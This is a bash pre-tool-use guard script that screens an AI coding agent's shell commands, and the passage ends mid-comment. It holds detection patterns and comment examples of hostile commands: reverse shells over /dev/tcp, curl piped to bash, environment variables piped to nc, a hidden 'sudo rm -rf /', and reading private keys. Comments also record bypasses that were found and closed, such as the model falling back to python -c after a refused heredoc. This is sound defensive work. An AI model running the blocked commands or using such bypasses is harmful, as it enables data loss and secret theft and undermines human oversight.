#!/usr/bin/env bash
# PreToolUse guard for Bash commands.
# Runs in ALL modes — including the --dangerously-skip-permissions alias — so it
# is the real backstop there, where settings.json allow/ask/deny is bypassed.
#   deny = destructive infra / system / secret-exfiltration (do it by hand)
#   ask  = mutating infra you should confirm in the moment
# NOTE: no `set -e` — grep returning 1 on "no match" must not kill the script.
set -uo pipefail
# NOTE: `set -f` because operands are word-split with `set -- $rest` below; without it
# `src/*.py` expands against the hook's own cwd, and a glob that happens to match one
# file turns into a single literal operand.
set -f

input="$(cat)"
cmd="$(printf '%s' "$input" | jq -r '.tool_input.command // empty')"
[[ -n "$cmd" ]] || exit 0

# Cheap prefilter: the hook runs on EVERY command, and one pass over the string
# is three times cheaper than segmenting plus twenty greps. It is a strict
# superset of everything the rules below can fire on.
# NOTE: adding a rule with a new command name means adding the name here too.
# NOTE: the second group has no closing \b on purpose — exfiltration and
# pipe-to-shell rules match these as substrings, and `\bnc\b` let `env | ncat h
# p` through the filter, turning a hard deny into silence.
GATED='\b(terraform|kubectl|helm|nomad|docker|git|rm|sudo|chmod|ansible-playbook|python3?|node|uv|zsh|bash|sh|dash|ksh|age-keygen|cat|tee|sed|head|tail|bat|nl|less|more|echo|printf)\b|\b(curl|wget|nc|base64|xxd)|/dev/tcp|\.ssh\b|\.config/sops/age|\.env'
grep -Eq "$GATED" <<<"$cmd" || exit 0

emit() {
  jq -nc --arg d "$1" --arg r "$2" \
    '{hookSpecificOutput:{hookEventName:"PreToolUse",permissionDecision:$d,permissionDecisionReason:$r}}'
  exit 0
}

# mentions: does the command contain one of these words at all? A bash regex, no
# fork. Every rule block is gated on it, because each rule below costs two or three
# processes and the full set is 140–230 of them (300–500 ms per Bash call, measured);
# a command that never says `git` needs none of the git rules.
mentions() {
  local re="(^|[^[:alnum:]_])($1)([^[:alnum:]_]|$)"
  [[ $cmd =~ $re ]]
}
deny() { emit deny "$1"; }
ask()  { emit ask  "$1"; }

# has: match anywhere (for content patterns that are dangerous regardless).
has() { grep -Eq "$1" <<<"$cmd"; }
# at: match only at COMMAND POSITION — start of line or right after a shell
# separator. Stops phrases quoted inside `git commit -m "..."` from counting.
CP='(^|[;&|]|&&|\|\|)[[:space:]]*'
at() { grep -Eq "${CP}$1" <<<"$cmd"; }

# NOTE: splitting must understand quoting or it breaks BOTH ways. Splitting on
# every ; and | tore `curl -H 'Cookie: a=1; b=2' -o ~/.zshrc URL` in half so no
# segment held both the head and -o, and it fired on quoted prose like `git
# commit -m "cleanup; rm -r old files"`. So: walk the string, track quote state,
# split only on UNQUOTED separators. `&` splits too, and `(` `)` so a command
# inside $(...) becomes its own segment head.
# NOTE: written via a quoted heredoc — awk needs both quote characters as
# literals.
SPLIT_AWK=$(cat <<'AWK'
function walk(s,   n, i, c, out, q, rest, tag) {
  n = length(s); out = ""; q = ""
  for (i = 1; i <= n; i++) {
    c = substr(s, i, 1)
    if (q != "") {
      if (c == "\\" && q == "\"") { i++; out = out c substr(s, i, 1); continue }
      # NOTE: substitution inside DOUBLE quotes still runs, so "$(sudo ls)" is a
      # command position too. Without this branch `echo "$(sudo rm -rf /)"`
      # passed.
      if (q == "\"" && (c == "`" || (c == "$" && substr(s, i+1, 1) == "("))) {
        print out; out = ""
        if (c == "$") i++
        continue
      }
      if (c == q) q = ""
      out = out c
      continue
    }
    if (c == "\\") { i++; out = out c substr(s, i, 1); continue }
    if (c == "'" || c == "\"") { q = c; out = out c; continue }
    # NOTE: a heredoc opener counts only at an UNQUOTED position. Matching the
    # tag against the raw line meant `git commit -m "docs: describe <<EOF
    # usage"` switched the rest of the command off — one `<<Word` in prose
    # disabled the guard entirely.
    if (c == "<" && substr(s, i+1, 1) == "<" && substr(s, i+2, 1) != "<" && hd == "") {
      rest = substr(s, i)
      if (match(rest, /^<<-?[[:space:]]*["']?[A-Za-z_][A-Za-z0-9_]*["']?/)) {
        tag = substr(rest, RSTART, RLENGTH)
        sub(/^<<-?[[:space:]]*/, "", tag)
        gsub(/["']/, "", tag)
        hd = tag
      }
    }
    if (c == ";" || c == "|" || c == "&" || c == "(" || c == ")" || c == "`") {
      print out; out = ""; continue
    }
    out = out c
  }
  print out
}
{
  # NOTE: a heredoc body is data, not commands — but only for splitting. For
  # `has` it is the opposite (the body IS the script to read), so the skip lives
  # only here.
  buf[++nb] = $0
  if (hd != "") {
    line = $0
    sub(/^[[:space:]]+/, "", line)          # <<- allows an indented terminator
    sub(/[[:space:]]+$/, "", line)
    if (line == hd) hd = ""
    next
  }
  hdopen = nb
  walk($0)
}
END {
  # NOTE: an unclosed tag means `<<` never opened a heredoc (`$((1 << n))`,
  # `<<TAG` in prose). The tail cannot be swallowed silently — real commands may
  # live there.
  if (hd != "") for (i = hdopen + 1; i <= nb; i++) { hd = ""; walk(buf[i]) }
}
AWK
)

# `zsh -c "terraform destroy"` is one command headed by zsh, and without this
# step no rule looks inside the quotes.
# NOTE: flags before -c must be allowed — `bash -lc "…"` is the most common form
# of all. The body used to be cut as ${line#*-c}, i.e. at the first "-c"
# substring, which does not exist in -lc/-ec/-ic/-xc, so nothing looked inside —
# while bash/sh/zsh sit in allow precisely because this parsing was believed to
# work.
# NOTE: the body is bounded by quotes or one word, not `.*` — that way grep -Eo
# returns EVERY `<shell> -c` in the line, not just the first.
SHELLC_FLAGS='([[:space:]]+(-o[[:space:]]+[^[:space:]]+|--[a-z][a-z-]*|-[a-zA-Z]+))*[[:space:]]+-[a-zA-Z]*c[[:space:]]+'
SHELLC_RE=$(cat <<RE
(^|[[:space:]])([^[:space:]]*/)?(zsh|bash|sh|dash|ksh)${SHELLC_FLAGS}("[^"]*"|'[^']*'|[^[:space:]]+)
RE
)
SHELLC_STRIP=$(cat <<RE
s/^[[:space:]]*([^[:space:]]*\/)?(zsh|bash|sh|dash|ksh)${SHELLC_FLAGS}//
RE
)
shellc_bodies() {
  local line body first last
  # Cheap reject before the expensive grep -Eo, which scans the whole line
  # regardless.
  grep -qE '(^|[[:space:]/])(zsh|bash|sh|dash|ksh)[[:space:]]+-' <<<"$cmd" || return 0
  while IFS= read -r line; do
    body=$(sed -E "$SHELLC_STRIP" <<<"$line")
    first=${body:0:1}; last=${body: -1}
    if [[ ( $first == '"' && $last == '"' ) || ( $first == "'" && $last == "'" ) ]]; then
      body=${body:1:${#body}-2}
    fi
    printf '%s\n' "$body"
  done < <(printf '%s\n' "$cmd" | grep -Eo -- "$SHELLC_RE")
}

# Parsed once per run: every rule calls segs(), and on a large command each
# recount is an awk plus two greps.
SEGS=''
segs() {
  if [[ -z $SEGS ]]; then
    SEGS=$( { printf '%s\n' "$cmd" | awk "$SPLIT_AWK"; shellc_bodies | awk "$SPLIT_AWK"; } )
  fi
  printf '%s\n' "$SEGS"
}

# NOTE: every git rule must tolerate global flags before the subcommand, or
# `Bash(git -C:*)` in allow becomes a bypass for the push gate, the gitleaks
# scan and the `reset --hard` deny alike. The list comes from `git --help`, not
# from memory — a missed flag bypasses all git rules at once.
GITPFX=$(cat <<'RE'
git([[:space:]]+(-C[[:space:]]*[^[:space:]]+|-c[[:space:]]*[^[:space:]]*("[^"]*"|'[^']*')?[^[:space:]]*|--(git-dir|work-tree|namespace|exec-path)([[:space:]]+|=)[^[:space:]]+|-[pP]|--(paginate|no-pager|bare|literal-pathspecs|no-optional-locks|no-replace-objects|no-lazy-fetch)))*[[:space:]]+
RE
)
# NOTE: pipelines, not a loop with a grep per segment — a heredoc carrying a
# script body cuts into thousands of segments, and a 289 KB command took over
# three minutes and tens of thousands of processes. Here the process count is
# constant.
# NOTE: no `-q` in the last stage — it closes the pipe on the first match, the
# upstream grep gets SIGPIPE, and under pipefail a successful search would
# return non-zero.
# NOTE: `--` is required — a rule's pattern may start with a dash (`-c
# …hooksPath`), and without it grep reads it as flags and dies with usage, i.e.
# the rule silently stops firing instead of breaking loudly.
seg_with() { segs | grep -E -- "^[[:space:]]*$1" | grep -E -- "$2" >/dev/null; }
# any segment headed by $1 — the same question `at` answers, but decided by the
# quote-aware splitter. CP does not treat `$(` as a command position, so `at`
# misses `echo $(docker volume rm x)`; conversely `git commit -m "chore(sudo):
# …"` would false-deny if `(` were added to CP.
seg_head() { segs | grep -E -- "^[[:space:]]*$1" >/dev/null; }
# segment headed by $1 that does NOT match $2. Empty input means no such
# command.
seg_without() { segs | grep -E -- "^[[:space:]]*$1" | grep -vE -- "$2" >/dev/null; }

# ---- DENY: destructive infrastructure (manual only) ----
if mentions 'terraform|kubectl|helm|nomad|docker'; then
seg_head 'terraform[[:space:]]+destroy\b'                  && deny "terraform destroy — run it manually"
seg_head 'terraform[[:space:]]+state[[:space:]]+(rm|mv)\b' && deny "terraform state rm/mv — manual only"
seg_head 'kubectl[[:space:]]+(delete|drain)\b'             && deny "kubectl delete/drain — manual only"
seg_head 'helm[[:space:]]+(uninstall|rollback)\b'          && deny "helm uninstall/rollback — manual only"
seg_head 'nomad[[:space:]]+(job[[:space:]]+(stop|purge)|node[[:space:]]+drain|alloc[[:space:]]+stop)\b' \
                                                           && deny "nomad stop/purge/drain — manual only"
# Same class as `docker system prune`: named volumes are somebody's data.
seg_head 'docker[[:space:]]+volume[[:space:]]+prune\b'     && deny "docker volume prune wipes unused volumes — manual only"
fi

# ---- DENY: git operations that throw work away ----
# NOTE: settings.json denies these by prefix, but a prefix never matches
# `git -C /repo reset --hard` — only the GITPFX rule closes that.
if mentions git; then
seg_head "${GITPFX}reset[[:space:]]+--hard\b"              && deny "git reset --hard discards uncommitted work — manual only"
seg_head "${GITPFX}clean\b"                                && deny "git clean deletes untracked files — manual only"
# NOTE: the short forms are the common ones, and `git branch`/`git checkout` are
# in allow — without these alternations work was deleted with no question at
# all.
seg_head "${GITPFX}branch[[:space:]]+(-[a-zA-Z]*D|-[a-zA-Z]*(fd|df)|--delete[[:space:]]+--force|--force[[:space:]]+--delete)\b" \
                                                           && deny "git branch force-delete — manual only"
seg_head "${GITPFX}(checkout([[:space:]]+--)?|restore)[[:space:]]+\.([[:space:]]|$)" \
                                                           && deny "discarding all local changes — manual only"
fi

# ---- DENY: destructive system / secret exfiltration (matters most under
# bypass) ----
mentions rm && seg_head 'rm[[:space:]]+-[a-zA-Z]*[rR][a-zA-Z]*[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*(/|~|\$HOME|/\*|~/\*|\$HOME/\*)([[:space:]]|$)' \
                                                           && deny "recursive delete of / or home"
mentions sudo && seg_head 'sudo\b'                         && deny "sudo — run it manually"
if [[ $cmd == *.env* ]] && seg_head '(cat|less|more|head|tail|bat)[[:space:]]+[^|;&]*\.env(\.[[:alnum:]_-]+)?' \
   && ! has '\.env\.(example|sample|template|dist)'; then deny "reading a plaintext .env file"; fi
mentions 'printenv|env|set' && at '(printenv|env|set)\b[^|]*\|[^|]*(base64|curl|wget|nc|xxd)' && deny "environment-variable exfiltration"
mentions 'curl|wget' && at '(curl|wget)\b[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(bash|sh|zsh)\b' && deny "pipe-to-shell from network"
# NOTE: narrowed after an audit (6 false, 0 true) — one-way probes like `echo
# >/dev/tcp/h/22` matched the old bare pattern. A real reverse shell needs an
# interactive shell or a duplex bind back to stdin.
if [[ $cmd == */dev/tcp/* ]] && { has '\b(bash|sh|zsh|dash|ksh)[[:space:]]+-[a-zA-Z]*i[a-zA-Z]*\b' \
   || has '(0>&1|0<&1|<>[[:space:]]*/dev/tcp/)'; }; then deny "reverse shell"; fi
# NOTE: the whole ~/.ssh is blocked by the literal ".ssh" — matching id_* or
# names containing "key" let the real key names through. Public artefacts
# (authorized_keys, known_hosts, config, *.pub) are stripped first and the REST
# is re-checked, so a mixed command like `cat authorized_keys work_ed25519` is
# still denied.
# NOTE: `has` matches anywhere, heredoc and echo bodies included. Narrowing to
# argument position is impossible without a full shell parse.
if [[ $cmd == *.ssh* || $cmd == *sops/age* || $cmd == *age-keygen* ]]; then
  cmd_pub_stripped=$(sed -E "s#\.ssh/(authorized_keys|known_hosts|config|sockets)[^[:space:]']*##g; s#\.ssh/[^[:space:]']*\.pub##g" <<<"$cmd")
  grep -Eq '(\.ssh\b|\.config/sops/age|\bage-keygen\b)' <<<"$cmd_pub_stripped" \
                                                           && deny "touching private keys"
fi

# ---- DENY: committing a secret (staged diff scanned by gitleaks) ---- Exit 1
# == leak found; any other code (git failure, gitleaks error) is treated as
# "nothing to block" so we never false-deny.
# NOTE: the scan must run against the repo being committed to, not the hook's
# cwd — otherwise a secret elsewhere is missed and a clean commit is blocked by
# a leak here.
if mentions git && seg_head "${GITPFX}commit\b" && command -v gitleaks >/dev/null 2>&1; then
  gitc=$(segs | grep -E "^[[:space:]]*${GITPFX}commit\b" \
         | grep -Eo -- '-C[[:space:]]*[^[:space:]]+' | sed -E 's/^-C[[:space:]]*//' | head -1)
  gitargs=()
  [[ -n $gitc ]] && gitargs=(-C "$gitc")
  git ${gitargs[@]+"${gitargs[@]}"} diff --cached --no-color 2>/dev/null \
    | gitleaks stdin --no-banner --redact >/dev/null 2>&1
  [[ ${PIPESTATUS[1]} -eq 1 ]] \
    && deny "gitleaks flagged a secret in the staged diff — review it, then commit by hand or add a .gitleaksignore entry if it is a false positive"
fi

# ---- DENY: file work that belongs to Edit / Write / Read ----
# An audit of six background jobs found that `cat > f <<EOF` and `python3 - <<PY …
# replace()` patches were 36 of the 50 harness rejections (the worktree isolation
# cannot verify a heredoc) and a third of the context. The bypass-mode harness text
# recommends exactly that, so only a deny outranks it. Scratch paths stay open: a
# helper script belongs in $CLAUDE_JOB_DIR/tmp and is run from there.
# NOTE: the job dir appears both as the variable and expanded (`/home/u/.claude/jobs/<id>/tmp`);
# the corpus run caught a real helper script denied on the literal form. macOS mktemp
# lands in /var/folders, and TMPDIR names it. `/tmp` without a trailing slash is the
# `cd /tmp && …` idiom.
SCRATCH_RE='^(/private)?/tmp(/|$)|CLAUDE_JOB_DIR|TMPDIR|^/var/folders/|\.claude/jobs/[^/]+/tmp(/|$)|/scratchpad(/|$)|^/dev/'
# The same set unanchored, for matching inside a script body.
SCRATCH_ANY='(/private)?/tmp(/|$|["'"'"'])|CLAUDE_JOB_DIR|TMPDIR|/var/folders/|\.claude/jobs/[^/]+/tmp|/scratchpad'
# The repo is the hook's cwd (the harness passes it; the process cwd is the fallback):
# a relative operand, or an absolute one under it. /etc, /proc, $HOME and another
# checkout are not the repo — ops diagnostics read those through the shell by design.
CWD="$(printf '%s' "$input" | jq -r '.cwd // empty')"
[[ -n $CWD ]] || CWD=$PWD
is_repo_path() {
  case $1 in
    /*) [[ $1 == "$CWD"/* ]] ;;
    '~'*|'$'*) return 1 ;;
    *) return 0 ;;
  esac
}
# A `cd` into scratch anywhere in the same command makes its relative operands
# scratch too — `cd $CLAUDE_JOB_DIR/tmp && sed -i … pages.mjs` is the normal way to
# iterate on a helper. Order is not checked (a `cd` after the operand is rare and
# would be its own mistake). Decided once per run.
CD_SCRATCH=''
cd_into_scratch() {
  if [[ -z $CD_SCRATCH ]]; then
    if segs | grep -E '^[[:space:]]*cd[[:space:]]+' \
         | sed -E 's/^[[:space:]]*cd[[:space:]]+//; s/^["'"'"']//; s/["'"'"']?[[:space:]]*$//' | grep -qE "$SCRATCH_RE"; then
      CD_SCRATCH=yes
    else
      CD_SCRATCH=no
    fi
  fi
  [[ $CD_SCRATCH == yes ]]
}
is_scratch() {
  grep -qE "$SCRATCH_RE" <<<"$1" && return 0
  [[ $1 != /* ]] && cd_into_scratch
}

# cat/tee carrying a heredoc into a redirect target outside scratch, and echo/printf
# redirected into one — the two ways the shell writes a file by hand.
# NOTE: a `$VAR` target cannot be resolved here and is left alone.
shell_writes_a_file() {
  local t
  while IFS= read -r t; do
    [[ -n $t ]] || continue
    [[ $t == '$'* ]] && continue
    is_scratch "$t" || return 0
  done < <({ segs | grep -E '^[[:space:]]*(cat|tee)\b' | grep -E '<<'; segs | grep -E '^[[:space:]]*(echo|printf)\b'; } \
    | sed -E 's/(>>?)[[:space:]]*"([^"]*)"/\1\2/g; s/(>>?)[[:space:]]*'"'"'([^'"'"']*)'"'"'/\1\2/g; s/"[^"]*"//g; s/'"'"'[^'"'"']*'"'"'//g' \
    | grep -Eo -- '(>>?[[:space:]]*|(^|[[:space:]])tee[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*)[^[:space:]<>|;&]+' \
    | sed -E 's/^[[:space:]]*(>>?[[:space:]]*|tee[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*)//')
  return 1
}
# NOTE: the first sed unquotes a redirect target (`> "$DIR/x"` → `>$DIR/x`) and then
# drops every other quoted string, so a `>` inside `echo "=== <svg> ==="` is prose
# and not a redirect — that one was a real false deny from the corpus.
FILE_WORDS='cat|tee|sed|echo|printf|head|tail|bat|nl|less|more'
mentions "$FILE_WORDS" && shell_writes_a_file && deny "writing a file from the shell (heredoc, echo, printf) — Edit for a change, Write for a new file, a script for generated content; a helper script lives in \$CLAUDE_JOB_DIR/tmp"

# (The interpreter form of the same patch — read_text/replace/write_text from a
# `python3 - <<PY` body — is denied in the interpreter block below, where INTERP
# is defined.)

# sed -i on exactly one literal file is a single edit; sed earns its place only when
# the same change goes across many files (several operands, a glob, find/xargs).
# NOTE: quoted arguments are the expression, so they are dropped before counting;
# an unquoted expression counts as an operand and lets the command through.
sed_i_on_one_file() {
  local seg rest
  while IFS= read -r seg; do
    rest=$(sed -E "s/'[^']*'//g; s/\"[^\"]*\"//g; s/(^|[[:space:]])-[^[:space:]]*//g; s/^[[:space:]]*sed([[:space:]]|$)//" <<<"$seg")
    # shellcheck disable=SC2086
    set -- $rest
    [[ $# -eq 1 ]] || continue
    [[ $1 == *[*?[]* ]] && continue
    is_scratch "$1" && continue
    is_repo_path "$1" || continue
    return 0
  done < <(segs | grep -E '^[[:space:]]*sed[[:space:]]' | grep -E -- '(^|[[:space:]])(-[a-zA-Z]*i|--in-place)')
  return 1
}
mentions sed && sed_i_on_one_file && deny "sed -i on one file is a single edit — use Edit; sed is for the same change across many files"

# A command that only dumps repo files into the context: every segment is a reader
# (or an echo separator between readers), nothing is piped anywhere. The Read tool
# does this with offset/limit and stays tracked; Grep finds instead of dumping.
# NOTE: scratch, task outputs and logs are exempt — reading a background task's
# output through cat is the normal job flow.
only_reads_repo_files() {
  # `| cat` and `| cat -n` are not a filter — the dump just gets line numbers; any
  # other pipe is one. Two substitutions rather than one with `$` in a group: BSD sed.
  local stripped
  stripped=$(sed -E 's/\|[[:space:]]*cat([[:space:]]+-[a-zA-Z]+)*[[:space:]]*$//; s/\|[[:space:]]*cat([[:space:]]+-[a-zA-Z]+)*[[:space:]]*(;|&&|\|\|)/\2/g' <<<"$cmd")
  grep -q '|' <<<"$stripped" && return 1
  local seg head rest any=0 f
  while IFS= read -r seg; do
    [[ -z "${seg// /}" ]] && continue
    # `2>&1` and `2>/dev/null` are the suffix the model appends to everything; they do
    # not turn a dump into a write. The splitter cuts `2>&1` at the `&`, leaving a
    # segment that ends in `2>` and a segment that is just `1`.
    seg=$(sed -E 's/[0-9]*>&?[[:space:]]*$//; s#[0-9]*>[[:space:]]*/dev/(null|stderr|stdout)##g' <<<"$seg")
    [[ $seg == *'<<'* || $seg == *'>'* ]] && return 1
    read -r head _ <<<"$seg"
    case $head in
      echo|printf|cd|true|:|[0-9]|[0-9][0-9]) continue ;;
      # tail -f is a watch, cat -A/-v/-e/-t shows what Read cannot.
      tail) grep -qE '(^|[[:space:]])-[a-zA-Z]*[fF]' <<<"$seg" && return 1 ;;
      cat)  grep -qE '(^|[[:space:]])-[a-zA-Z]*[AvetT]' <<<"$seg" && return 1 ;;
      head|bat|nl|less|more) ;;
      sed) grep -qE '(^|[[:space:]])-[a-zA-Z]*n' <<<"$seg" || return 1 ;;
      *) return 1 ;;
    esac
    rest=$(sed -E "s/'[^']*'//g; s/\"[^\"]*\"//g; s/(^|[[:space:]])-[^[:space:]]*//g" <<<"$seg")
    # shellcheck disable=SC2086
    set -- $rest
    shift
    # a bare `cat` is the tail of a `| cat` (already stripped) or stdin — not a dump
    [[ $# -ge 1 ]] || continue
    for f in "$@"; do
      [[ $f == '$'* || $f == '~'* ]] && return 1
      is_scratch "$f" && return 1
      is_repo_path "$f" || return 1
      grep -qE '\.(output|log|txt)$' <<<"$f" && return 1
    done
    any=1
  done < <(segs)
  [[ $any -eq 1 ]]
}
mentions "$FILE_WORDS" && only_reads_repo_files && deny "dumping a repo file into the context — Read with offset/limit for a known file, Grep to find what you need"

# ---- Interpreters: judge the code, not the command name ----
# python/python3/node sit in allow on purpose: a prefix rule only ever sees
# `python3 -c`, while everything that decides safe-vs-not lives inside the
# quotes.
# NOTE: this block MUST stay below the gitleaks deny — ask() exits, so an ask
# placed above a deny silences it and `python3 -c "..." && git commit` would
# skip the scan.
# NOTE: the trailing [[:space:]] in INTERP is load-bearing. With `\b` there, the
# `(` anchor turned every conventional commit subject into an invocation: `git
# commit -m "fix(node): swap child_process for execa"` matched on `(node`, then
# hit the shell-out pattern and hard-denied the commit style CLAUDE.md mandates.
# NOTE: `uv run --with requests python -c …` is THE idiomatic uv one-liner and
# uv is allow-listed, so arbitrary tokens before the interpreter have to be
# tolerated.
INTERP='(^|[;&|(`]|&&|\|\||\$\()[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*((env|nice|nohup)[[:space:]]+|uv[[:space:]]+run[[:space:]]+([^[:space:]]+[[:space:]]+)*)*([^[:space:]]*/)?(python3?|node)[[:space:]]'
if mentions 'python3?|node' && has "$INTERP"; then
  # A script that read_text/replace/write_text-s a repo file — heredoc or one-line
  # `-c`, the latter being where the model goes after the heredoc is refused — is the
  # Edit tool done by hand, and the whole patch stays in the context. The write call is
  # matched in the raw command because the body IS the script; a body naming a scratch
  # path is left alone (it may well write there).
  # NOTE: the mode is the second argument, hence the comma — `open("analysis.json")`
  # has a quote followed by `a` too.
  if has '\.write_text\(|\bopen\([^)]*,[[:space:]]*\\?["'"'"'][wa]|\bwriteFileSync\(|\bwriteFile\(' \
     && ! has "$SCRATCH_ANY"; then
    deny "patching a file from an interpreter — that is Edit; a helper script lives in \$CLAUDE_JOB_DIR/tmp and runs from there"
  fi
  # NOTE: `__import__("os").system` and `from shutil import rmtree` reach the
  # same calls without ever writing the literal name.
  has 'os\.(system|popen|exec[lv]|spawn)|\bsubprocess\b|\bpty\.spawn\b|child_process|\b(exec|spawn|execFile)Sync\b|__import__\([^)]*(os|subprocess|pty)' \
                                                     && deny "interpreter shelling out — that escapes every pattern in this guard; write the shell command directly"
  has '\brmtree\(|os\.removedirs|\b(rm|rmdir)Sync\([^)]*recursive|\bfs\.rm(dir)?\([^)]*recursive' \
                                                     && deny "recursive tree delete from an interpreter"
  has '\b(urllib|requests|httpx|http\.client|socket|ftplib|smtplib|paramiko)\b|\bfetch\(|\baxios\b' \
                                                     && ask "interpreter opening the network — confirm?"
  # File write/delete asks were removed after an audit: 9/9 fires were routine
  # in-CWD edits the Edit tool performs silently. Shell-out and tree delete stay
  # hard denies.
fi

# ---- ASK: mutating infrastructure (confirm in the moment) ----
if mentions 'terraform|kubectl|helm|nomad'; then
seg_head 'terraform[[:space:]]+apply\b'           && ask "terraform apply — confirm?"
seg_head 'kubectl[[:space:]]+apply\b'             && ask "kubectl apply — confirm?"
seg_head 'helm[[:space:]]+(install|upgrade)\b'    && ask "helm install/upgrade — confirm?"
seg_head 'nomad[[:space:]]+job[[:space:]]+run\b'  && ask "nomad job run — confirm?"
fi
mentions chmod && seg_with 'chmod\b' '\b777\b'    && ask "chmod 777 — confirm?"

# NOTE: `Bash(git push:*)` catches only the bare prefix, so with `git -C` in
# allow a push from another directory would go out silently.
# Pushing a feature branch is the normal end of an autonomous run, and a blanket
# ask there waited 14–118 minutes for nobody in the audited sessions. What still
# asks: a protected branch, --force, a remote delete, --all/--mirror, a glob
# refspec, and a target it cannot tell.
PROTECTED_BRANCH_RE='^(refs/heads/)?(main|master|prod|production|release(/.*)?)$'
current_branch() { git -C "$1" symbolic-ref --short HEAD 2>/dev/null; }
# `GIT_DIR=x git push` puts the assignment BEFORE the literal "git", which
# GITPFX (anchored right at the segment start) never matches on its own —
# without this the whole push gate silently never fired for that shape at
# all. Zero-or-more, so a plain `git push` still matches with nothing consumed.
ENVPFX='([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*'
# A cd/pushd ANYWHERE in the command changes the directory a `-C`-less push
# actually runs in; simplest-and-safe is asking rather than trying to resolve
# the literal target (see push_needs_confirm's own use, below).
ANY_CD_PUSHD=''
any_cd_or_pushd() {
  if [[ -z $ANY_CD_PUSHD ]]; then
    if segs | grep -Eq '^[[:space:]]*(cd|pushd)([[:space:]]|$)'; then ANY_CD_PUSHD=yes; else ANY_CD_PUSHD=no; fi
  fi
  [[ $ANY_CD_PUSHD == yes ]]
}
# Backslash-newline continuation (`git push \` + NL + `  --force ...`) is one
# logical line to the shell, but SPLIT_AWK/segs() process $cmd one PHYSICAL
# line (awk record) at a time, so it comes out as two segments — and every
# check below, which looks at one segment at a time, never sees a flag or
# refspec that landed on the continuation line. Joining `\<NL>` into a space
# before re-segmenting fixes this for push specifically (mirroring the join
# rules.go's pushNeedsConfirm does on its own, already-whole segment text).
push_cmd=$(printf '%s' "$cmd" | sed -e ':a' -e '/\\$/{N;s/\\\n/ /;ba' -e '}')
PUSH_SEGS=''
push_segs() {
  if [[ -z $PUSH_SEGS ]]; then
    PUSH_SEGS=$( { printf '%s\n' "$push_cmd" | awk "$SPLIT_AWK"; shellc_bodies | awk "$SPLIT_AWK"; } )
  fi
  printf '%s\n' "$PUSH_SEGS"
}
# push_needs_confirm: prints the reason and returns 0 when the push must be confirmed.
push_needs_confirm() {
  local seg dir rest remote has_ref dst tok
  while IFS= read -r seg; do
    # GIT_DIR=/GIT_WORK_TREE= (env-var form) or --git-dir/--work-tree (flag
    # form, already tolerated by GITPFX) relocate the repo the push targets
    # in a way this guard cannot resolve structurally — ask rather than
    # silently fall back to -C/cwd, which would then be the wrong repo.
    grep -qE -- '(^|[[:space:]])(GIT_DIR|GIT_WORK_TREE)=|(^|[[:space:]])--(git-dir|work-tree)([[:space:]]|=)' <<<"$seg" \
      && { echo "git push — could not tell the target branch, confirm?"; return 0; }
    # NOTE: -[a-zA-Z]*f[a-zA-Z]* (not a bare -f) catches bundled forms like
    # -fu/-uf — the same shape rm's recursive-flag detection uses for -r.
    grep -qE -- '(^|[[:space:]])-[a-zA-Z]*f[a-zA-Z]*([[:space:]]|$)|(^|[[:space:]])--force(-with-lease(=[^[:space:]]*)?)?([[:space:]]|$)|[[:space:]]\+[^[:space:]]+' <<<"$seg" \
      && { echo "git push --force rewrites history — confirm?"; return 0; }
    grep -qE -- '(^|[[:space:]])(-d|--delete)([[:space:]]|$)|[[:space:]]:[^[:space:]]+' <<<"$seg" \
      && { echo "git push deleting a remote branch — confirm?"; return 0; }
    grep -qE -- '(^|[[:space:]])--(all|mirror)([[:space:]]|$)' <<<"$seg" \
      && { echo "git push --all/--mirror pushes every branch — confirm?"; return 0; }
    # The segmenter itself splits on a bare `(` or backtick, even inside
    # $(...)/`...` and even inside double quotes (see SPLIT_AWK) — so a
    # refspec/remote built from a command substitution is cut clean off this
    # segment rather than merely absent. An unquoted `(`, backtick or `$`
    # sitting immediately after this segment's own text in push_cmd (the
    # command this segment was actually cut from) is that cut: the real
    # target is unknowable, not just missing.
    case "$push_cmd" in
      *"$seg"'`'*|*"$seg"'('*|*"$seg"'$'*)
        echo "git push — could not tell the target branch, confirm?"; return 0 ;;
    esac
    dir=$(grep -Eo -- '-C[[:space:]]*[^[:space:]]+' <<<"$seg" | head -1 | sed -E 's/^-C[[:space:]]*//')
    if [[ -z $dir ]] && any_cd_or_pushd; then
      echo "git push — could not tell the target branch, confirm?"; return 0
    fi
    rest=$(sed -E 's/^.*[[:space:]]push([[:space:]]|$)//' <<<"$seg")
    remote=''; has_ref=0
    # shellcheck disable=SC2086
    set -- $rest
    for tok in "$@"; do
      tok=${tok#[\"\']}; tok=${tok%[\"\']}
      [[ $tok == -* || $tok == *[\<\>]* ]] && continue
      if [[ -z $remote ]]; then
        remote=$tok
        [[ $remote == *['$`']* ]] && { echo "git push — could not tell the target branch, confirm?"; return 0; }
        continue
      fi
      has_ref=1
      [[ $tok == *'*'* ]] && { echo "git push with a glob refspec — confirm?"; return 0; }
      # A refspec built from a variable/substitution ($b, ${T:-main}) is not a
      # literal branch name the protected-branch regex can ever match — ask
      # rather than silently trust text that is not what it looks like.
      [[ $tok == *['$`']* ]] && { echo "git push — could not tell the target branch, confirm?"; return 0; }
      dst=${tok#*:}
      [[ $dst == HEAD || $dst == @ ]] && dst=$(current_branch "${dir:-$CWD}")
      [[ -z $dst ]] && { echo "git push — could not tell the target branch, confirm?"; return 0; }
      grep -qE "$PROTECTED_BRANCH_RE" <<<"$dst" && { echo "git push to a protected branch ($dst) — confirm?"; return 0; }
    done
    if [[ $has_ref -eq 0 ]]; then
      dst=$(current_branch "${dir:-$CWD}")
      [[ -z $dst ]] && { echo "git push — could not tell the current branch, confirm?"; return 0; }
      grep -qE "$PROTECTED_BRANCH_RE" <<<"$dst" && { echo "git push to a protected branch ($dst) — confirm?"; return 0; }
    fi
  done < <(push_segs | grep -E -- "^[[:space:]]*${ENVPFX}${GITPFX}push\b")
  return 1
}
if mentions git && seg_head "${ENVPFX}${GITPFX}push\b"; then
  push_reason=$(push_needs_confirm) && ask "$push_reason"
fi

# ---- ASK by argument, not by command name ---- These three were blanket `ask`
# entries in settings.json and the top prompt generators there, almost always on
# a dry-run or read-only form a prefix rule cannot tell apart.

# NOTE: --check IS the dry run CLAUDE.md mandates. Per segment, because
